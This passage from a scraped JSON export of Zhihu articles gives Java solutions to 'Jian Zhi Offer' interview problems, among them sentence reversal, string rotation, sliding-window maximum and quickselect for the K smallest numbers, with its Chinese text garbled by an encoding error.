class=\"n\">list</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">i</span><span class=\"o\">);</span>\n            <span class=\"n\">ret</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">list</span><span class=\"o\">);</span>\n            <span class=\"n\">curSum</span> <span class=\"o\">-=</span> <span class=\"n\">start</span><span class=\"o\">;</span>\n            <span class=\"n\">start</span><span class=\"o\">++;</span>\n            <span class=\"n\">end</span><span class=\"o\">++;</span>\n            <span class=\"n\">curSum</span> <span class=\"o\">+=</span> <span class=\"n\">end</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">ret</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>58.1 ç¿»è½¬å•è¯é¡ºåºåˆ—</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/3194a4f4cf814f63919d0790578d51f3%3FtpId%3D13%26tqId%3D11197%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><div class=\"highlight\"><pre><code class=\"language-html\">Input:\n&#34;I am a student.&#34;\n\nOutput:\n&#34;student. a am I&#34;</code></pre></div><h2>è§£é¢˜æ€è·¯</h2><p>é¢˜ç›®åº”è¯¥æœ‰ä¸€ä¸ªéšå«æ¡ä»¶ï¼Œå°±æ˜¯ä¸èƒ½ç”¨é¢å¤–çš„ç©ºé—´ã€‚è™½ç„¶ Java çš„é¢˜ç›®è¾“å…¥å‚æ•°ä¸º String ç±»å‹ï¼Œéœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªå­—ç¬¦æ•°ç»„ä½¿å¾—ç©ºé—´å¤æ‚åº¦ä¸º O(N)ï¼Œä½†æ˜¯æ­£ç¡®çš„å‚æ•°ç±»å‹åº”è¯¥å’ŒåŸä¹¦ä¸€æ ·ï¼Œä¸ºå­—ç¬¦æ•°ç»„ï¼Œå¹¶ä¸”åªèƒ½ä½¿ç”¨è¯¥å­—ç¬¦æ•°ç»„çš„ç©ºé—´ã€‚ä»»ä½•ä½¿ç”¨äº†é¢å¤–ç©ºé—´çš„è§£æ³•åœ¨é¢è¯•æ—¶éƒ½ä¼šå¤§æ‰“æŠ˜æ‰£ï¼ŒåŒ…æ‹¬é€’å½’è§£æ³•ã€‚</p><p>æ­£ç¡®çš„è§£æ³•åº”è¯¥æ˜¯å’Œä¹¦ä¸Šä¸€æ ·ï¼Œå…ˆæ—‹è½¬æ¯ä¸ªå•è¯ï¼Œå†æ—‹è½¬æ•´ä¸ªå­—ç¬¦ä¸²ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">String</span> <span class=\"nf\">ReverseSentence</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">str</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">n</span> <span class=\"o\">=</span> <span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">();</span>\n    <span class=\"kt\">char</span><span class=\"o\">[]</span> <span class=\"n\">chars</span> <span class=\"o\">=</span> <span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">toCharArray</span><span class=\"o\">();</span>\n    <span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">j</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">j</span> <span class=\"o\">&lt;=</span> <span class=\"n\">n</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">j</span> <span class=\"o\">==</span> <span class=\"n\">n</span> <span class=\"o\">||</span> <span class=\"n\">chars</span><span class=\"o\">[</span><span class=\"n\">j</span><span class=\"o\">]</span> <span class=\"o\">==</span> <span class=\"sc\">&#39; &#39;</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"n\">reverse</span><span class=\"o\">(</span><span class=\"n\">chars</span><span class=\"o\">,</span> <span class=\"n\">i</span><span class=\"o\">,</span> <span class=\"n\">j</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">);</span>\n            <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">j</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span>\n        <span class=\"n\">j</span><span class=\"o\">++;</span>\n    <span class=\"o\">}</span>\n    <span class=\"n\">reverse</span><span class=\"o\">(</span><span class=\"n\">chars</span><span class=\"o\">,</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">n</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">);</span>\n    <span class=\"k\">return</span> <span class=\"k\">new</span> <span class=\"n\">String</span><span class=\"o\">(</span><span class=\"n\">chars</span><span class=\"o\">);</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">reverse</span><span class=\"o\">(</span><span class=\"kt\">char</span><span class=\"o\">[]</span> <span class=\"n\">c</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">j</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">j</span><span class=\"o\">)</span>\n        <span class=\"n\">swap</span><span class=\"o\">(</span><span class=\"n\">c</span><span class=\"o\">,</span> <span class=\"n\">i</span><span class=\"o\">++,</span> <span class=\"n\">j</span><span class=\"o\">--);</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">swap</span><span class=\"o\">(</span><span class=\"kt\">char</span><span class=\"o\">[]</span> <span class=\"n\">c</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">j</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">char</span> <span class=\"n\">t</span> <span class=\"o\">=</span> <span class=\"n\">c</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">];</span>\n    <span class=\"n\">c</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">c</span><span class=\"o\">[</span><span class=\"n\">j</span><span class=\"o\">];</span>\n    <span class=\"n\">c</span><span class=\"o\">[</span><span class=\"n\">j</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">t</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>58.2 å·¦æ—‹è½¬å­—ç¬¦ä¸²</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/12d959b108cb42b1ab72cef4d36af5ec%3FtpId%3D13%26tqId%3D11196%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><div class=\"highlight\"><pre><code class=\"language-html\">Input:\nS=&#34;abcXYZdef&#34;\nK=3\n\nOutput:\n&#34;XYZdefabc&#34;</code></pre></div><h2>è§£é¢˜æ€è·¯</h2><p>å…ˆå°† &#34;abc&#34; å’Œ &#34;XYZdef&#34; åˆ†åˆ«ç¿»è½¬ï¼Œå¾—åˆ° &#34;cbafedZYX&#34;ï¼Œç„¶åå†æŠŠæ•´ä¸ªå­—ç¬¦ä¸²ç¿»è½¬å¾—åˆ° &#34;XYZdefabc&#34;ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">String</span> <span class=\"nf\">LeftRotateString</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">str</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">n</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">n</span> <span class=\"o\">&gt;=</span> <span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">())</span>\n        <span class=\"k\">return</span> <span class=\"n\">str</span><span class=\"o\">;</span>\n    <span class=\"kt\">char</span><span class=\"o\">[]</span> <span class=\"n\">chars</span> <span class=\"o\">=</span> <span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">toCharArray</span><span class=\"o\">();</span>\n    <span class=\"n\">reverse</span><span class=\"o\">(</span><span class=\"n\">chars</span><span class=\"o\">,</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">n</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">);</span>\n    <span class=\"n\">reverse</span><span class=\"o\">(</span><span class=\"n\">chars</span><span class=\"o\">,</span> <span class=\"n\">n</span><span class=\"o\">,</span> <span class=\"n\">chars</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">);</span>\n    <span class=\"n\">reverse</span><span class=\"o\">(</span><span class=\"n\">chars</span><span class=\"o\">,</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">chars</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">);</span>\n    <span class=\"k\">return</span> <span class=\"k\">new</span> <span class=\"n\">String</span><span class=\"o\">(</span><span class=\"n\">chars</span><span class=\"o\">);</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">reverse</span><span class=\"o\">(</span><span class=\"kt\">char</span><span class=\"o\">[]</span> <span class=\"n\">chars</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">j</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">j</span><span class=\"o\">)</span>\n        <span class=\"n\">swap</span><span class=\"o\">(</span><span class=\"n\">chars</span><span class=\"o\">,</span> <span class=\"n\">i</span><span class=\"o\">++,</span> <span class=\"n\">j</span><span class=\"o\">--);</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">swap</span><span class=\"o\">(</span><span class=\"kt\">char</span><span class=\"o\">[]</span> <span class=\"n\">chars</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">j</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">char</span> <span class=\"n\">t</span> <span class=\"o\">=</span> <span class=\"n\">chars</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">];</span>\n    <span class=\"n\">chars</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">chars</span><span class=\"o\">[</span><span class=\"n\">j</span><span class=\"o\">];</span>\n    <span class=\"n\">chars</span><span class=\"o\">[</span><span class=\"n\">j</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">t</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>59. æ»‘åŠ¨çª—å£çš„æœ€å¤§å€¼</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/1624bc35a45c42c0bc17d17fa0cba788%3FtpId%3D13%26tqId%3D11217%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>ç»™å®šä¸€ä¸ªæ•°ç»„å’Œæ»‘åŠ¨çª—å£çš„å¤§å°ï¼Œæ‰¾å‡ºæ‰€æœ‰æ»‘åŠ¨çª—å£é‡Œæ•°å€¼çš„æœ€å¤§å€¼ã€‚</p><p>ä¾‹å¦‚ï¼Œå¦‚æœè¾“å…¥æ•°ç»„ {2, 3, 4, 2, 6, 2, 5, 1} åŠæ»‘åŠ¨çª—å£çš„å¤§å° 3ï¼Œé‚£ä¹ˆä¸€å…±å­˜åœ¨ 6 ä¸ªæ»‘åŠ¨çª—å£ï¼Œä»–ä»¬çš„æœ€å¤§å€¼åˆ†åˆ«ä¸º {4, 4, 6, 6, 6, 5}ã€‚</p><h2>è§£é¢˜æ€è·¯</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"nf\">maxInWindows</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">num</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">size</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"n\">ret</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;&gt;();</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">size</span> <span class=\"o\">&gt;</span> <span class=\"n\">num</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">||</span> <span class=\"n\">size</span> <span class=\"o\">&lt;</span> <span class=\"n\">1</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">ret</span><span class=\"o\">;</span>\n    <span class=\"n\">PriorityQueue</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"n\">heap</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">PriorityQueue</span><span class=\"o\">&lt;&gt;((</span><span class=\"n\">o1</span><span class=\"o\">,</span> <span class=\"n\">o2</span><span class=\"o\">)</span> <span class=\"o\">-&gt;</span> <span class=\"n\">o2</span> <span class=\"o\">-</span> <span class=\"n\">o1</span><span class=\"o\">);</span>  <span class=\"cm\">/* å¤§é¡¶å † */</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">size</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span>\n        <span class=\"n\">heap</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">num</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]);</span>\n    <span class=\"n\">ret</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">heap</span><span class=\"o\">.</span><span class=\"na\">peek</span><span class=\"o\">());</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">j</span> <span class=\"o\">=</span> <span class=\"n\">i</span> <span class=\"o\">+</span> <span class=\"n\">size</span><span class=\"o\">;</span> <span class=\"n\">j</span> <span class=\"o\">&lt;</span> <span class=\"n\">num</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++,</span> <span class=\"n\">j</span><span class=\"o\">++)</span> <span class=\"o\">{</span>            <span class=\"cm\">/* ç»´æŠ¤ä¸€ä¸ªå¤§å°ä¸º size çš„å¤§é¡¶å † */</span>\n        <span class=\"n\">heap</span><span class=\"o\">.</span><span class=\"na\">remove</span><span class=\"o\">(</span><span class=\"n\">num</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]);</span>\n        <span class=\"n\">heap</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">num</span><span class=\"o\">[</span><span class=\"n\">j</span><span class=\"o\">]);</span>\n        <span class=\"n\">ret</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">heap</span><span class=\"o\">.</span><span class=\"na\">peek</span><span class=\"o\">());</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">ret</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>å¾®ä¿¡å…¬ä¼—å·</h2><p>ä½ å¯ä»¥åœ¨æˆ‘çš„å¾®ä¿¡å…¬ä¼—å·åå°ä¸æˆ‘äº¤æµã€‚å¦å¤–ï¼Œå…¬ä¼—å·ä¹Ÿæä¾›äº†ä¸€ä»½æŠ€æœ¯é¢è¯•å¤ä¹ å¤§çº²ï¼Œä¸ä»…ç³»ç»Ÿæ•´ç†äº†é¢è¯•çŸ¥è¯†ç‚¹ï¼Œè€Œä¸”æ ‡æ³¨äº†å„ä¸ªçŸ¥è¯†ç‚¹çš„é‡è¦ç¨‹åº¦ï¼Œä»è€Œå¸®ä½ ç†æ¸…å¤šè€Œæ‚çš„é¢è¯•çŸ¥è¯†ç‚¹ï¼Œåå°å›å¤ &#34;å¤§çº²&#34; å³å¯é¢†å–ã€‚æˆ‘åŸºæœ¬æ˜¯æŒ‰ç…§è¿™ä¸ªå¤§çº²æ¥è¿›è¡Œå¤ä¹ çš„ï¼Œå¯¹æˆ‘æ‹¿åˆ°äº† BAT å¤´æ¡ç­‰ Offer èµ·åˆ°å¾ˆå¤§çš„å¸®åŠ©ã€‚ä½ ä»¬å®Œå…¨å¯ä»¥å’Œæˆ‘ä¸€æ ·æ ¹æ®å¤§çº²ä¸Šåˆ—çš„çŸ¥è¯†ç‚¹æ¥è¿›è¡Œå¤ä¹ ï¼Œå°±ä¸ç”¨çœ‹å¾ˆå¤šä¸é‡è¦çš„å†…å®¹ï¼Œä¹Ÿå¯ä»¥çŸ¥é“å“ªäº›å†…å®¹å¾ˆé‡è¦ä»è€Œå¤šå®‰æ’ä¸€äº›å¤ä¹ æ—¶é—´ã€‚å…¬ä¼—å·ä¹Ÿæä¾›äº†è¯¥é¡¹ç›®çš„ç¦»çº¿é˜…è¯»ç‰ˆæœ¬ï¼Œåå°å›å¤ &#34;ä¸‹è½½&#34; å³å¯é¢†å–ã€‚</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"354\" class=\"origin_image zh-lightbox-thumb\" width=\"937\" data-original=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;937&#39; height=&#39;354&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"354\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"937\" data-original=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_b.jpg\"/></figure><p></p>", 
            "topic": [
                {
                    "tag": "é¢è¯•", 
                    "tagLink": "https://api.zhihu.com/topics/19552079"
                }, 
                {
                    "tag": "ç®—æ³•", 
                    "tagLink": "https://api.zhihu.com/topics/19553510"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/69345978", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 0, 
            "title": "å‰‘æŒ‡ Offer é¢˜è§£ 40-49", 
            "content": "<ul><li><a href=\"https://zhuanlan.zhihu.com/p/69345978/edit#40-%E6%9C%80%E5%B0%8F%E7%9A%84-k-%E4%B8%AA%E6%95%B0\" class=\"internal\">40. æœ€å°çš„ K ä¸ªæ•°</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69345978/edit#411-%E6%95%B0%E6%8D%AE%E6%B5%81%E4%B8%AD%E7%9A%84%E4%B8%AD%E4%BD%8D%E6%95%B0\" class=\"internal\">41.1 æ•°æ®æµä¸­çš„ä¸­ä½æ•°</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69345978/edit#412-%E5%AD%97%E7%AC%A6%E6%B5%81%E4%B8%AD%E7%AC%AC%E4%B8%80%E4%B8%AA%E4%B8%8D%E9%87%8D%E5%A4%8D%E7%9A%84%E5%AD%97%E7%AC%A6\" class=\"internal\">41.2 å­—ç¬¦æµä¸­ç¬¬ä¸€ä¸ªä¸é‡å¤çš„å­—ç¬¦</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69345978/edit#42-%E8%BF%9E%E7%BB%AD%E5%AD%90%E6%95%B0%E7%BB%84%E7%9A%84%E6%9C%80%E5%A4%A7%E5%92%8C\" class=\"internal\">42. è¿ç»­å­æ•°ç»„çš„æœ€å¤§å’Œ</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69345978/edit#43-%E4%BB%8E-1-%E5%88%B0-n-%E6%95%B4%E6%95%B0%E4%B8%AD-1-%E5%87%BA%E7%8E%B0%E7%9A%84%E6%AC%A1%E6%95%B0\" class=\"internal\">43. ä» 1 åˆ° n æ•´æ•°ä¸­ 1 å‡ºç°çš„æ¬¡æ•°</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69345978/edit#44-%E6%95%B0%E5%AD%97%E5%BA%8F%E5%88%97%E4%B8%AD%E7%9A%84%E6%9F%90%E4%B8%80%E4%BD%8D%E6%95%B0%E5%AD%97\" class=\"internal\">44. æ•°å­—åºåˆ—ä¸­çš„æŸä¸€ä½æ•°å­—</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69345978/edit#45-%E6%8A%8A%E6%95%B0%E7%BB%84%E6%8E%92%E6%88%90%E6%9C%80%E5%B0%8F%E7%9A%84%E6%95%B0\" class=\"internal\">45. æŠŠæ•°ç»„æ’æˆæœ€å°çš„æ•°</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69345978/edit#46-%E6%8A%8A%E6%95%B0%E5%AD%97%E7%BF%BB%E8%AF%91%E6%88%90%E5%AD%97%E7%AC%A6%E4%B8%B2\" class=\"internal\">46. æŠŠæ•°å­—ç¿»è¯‘æˆå­—ç¬¦ä¸²</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69345978/edit#47-%E7%A4%BC%E7%89%A9%E7%9A%84%E6%9C%80%E5%A4%A7%E4%BB%B7%E5%80%BC\" class=\"internal\">47. ç¤¼ç‰©çš„æœ€å¤§ä»·å€¼</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69345978/edit#48-%E6%9C%80%E9%95%BF%E4%B8%8D%E5%90%AB%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6%E7%9A%84%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2\" class=\"internal\">48. æœ€é•¿ä¸å«é‡å¤å­—ç¬¦çš„å­å­—ç¬¦ä¸²</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69345978/edit#49-%E4%B8%91%E6%95%B0\" class=\"internal\">49. ä¸‘æ•°</a> </li></ul><h2>40. æœ€å°çš„ K ä¸ªæ•°</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/6a296eb82cf844ca8539b57c23e6e9bf%3FtpId%3D13%26tqId%3D11182%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>è§£é¢˜æ€è·¯</h2><h3>å¿«é€Ÿé€‰æ‹©</h3><ul><li>å¤æ‚åº¦ï¼šO(N) + O(1)</li><li>åªæœ‰å½“å…è®¸ä¿®æ”¹æ•°ç»„å…ƒç´ æ—¶æ‰å¯ä»¥ä½¿ç”¨</li></ul><p>å¿«é€Ÿæ’åºçš„ partition() æ–¹æ³•ï¼Œä¼šè¿”å›ä¸€ä¸ªæ•´æ•° j ä½¿å¾— a[l..j-1] å°äºç­‰äº a[j]ï¼Œä¸” a[j+1..h] å¤§äºç­‰äº a[j]ï¼Œæ­¤æ—¶ a[j] å°±æ˜¯æ•°ç»„çš„ç¬¬ j å¤§å…ƒç´ ã€‚å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§æ‰¾å‡ºæ•°ç»„çš„ç¬¬ K ä¸ªå…ƒç´ ï¼Œè¿™ç§æ‰¾ç¬¬ K ä¸ªå…ƒç´ çš„ç®—æ³•ç§°ä¸ºå¿«é€Ÿé€‰æ‹©ç®—æ³•ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"nf\">GetLeastNumbers_Solution</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">k</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"n\">ret</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;&gt;();</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">k</span> <span class=\"o\">&gt;</span> <span class=\"n\">nums</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">||</span> <span class=\"n\">k</span> <span class=\"o\">&lt;=</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">ret</span><span class=\"o\">;</span>\n    <span class=\"n\">findKthSmallest</span><span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"n\">k</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">);</span>\n    <span class=\"cm\">/* findKthSmallest ä¼šæ”¹å˜æ•°ç»„ï¼Œä½¿å¾—å‰ k ä¸ªæ•°éƒ½æ˜¯æœ€å°çš„ k ä¸ªæ•° */</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">k</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span>\n        <span class=\"n\">ret</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]);</span>\n    <span class=\"k\">return</span> <span class=\"n\">ret</span><span class=\"o\">;</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">findKthSmallest</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">k</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">l</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">h</span> <span class=\"o\">=</span> <span class=\"n\">nums</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">l</span> <span class=\"o\">&lt;</span> <span class=\"n\">h</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"kt\">int</span> <span class=\"n\">j</span> <span class=\"o\">=</span> <span class=\"n\">partition</span><span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"n\">l</span><span class=\"o\">,</span> <span class=\"n\">h</span><span class=\"o\">);</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">j</span> <span class=\"o\">==</span> <span class=\"n\">k</span><span class=\"o\">)</span>\n            <span class=\"k\">break</span><span class=\"o\">;</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">j</span> <span class=\"o\">&gt;</span> <span class=\"n\">k</span><span class=\"o\">)</span>\n            <span class=\"n\">h</span> <span class=\"o\">=</span> <span class=\"n\">j</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n        <span class=\"k\">else</span>\n            <span class=\"n\">l</span> <span class=\"o\">=</span> <span class=\"n\">j</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span 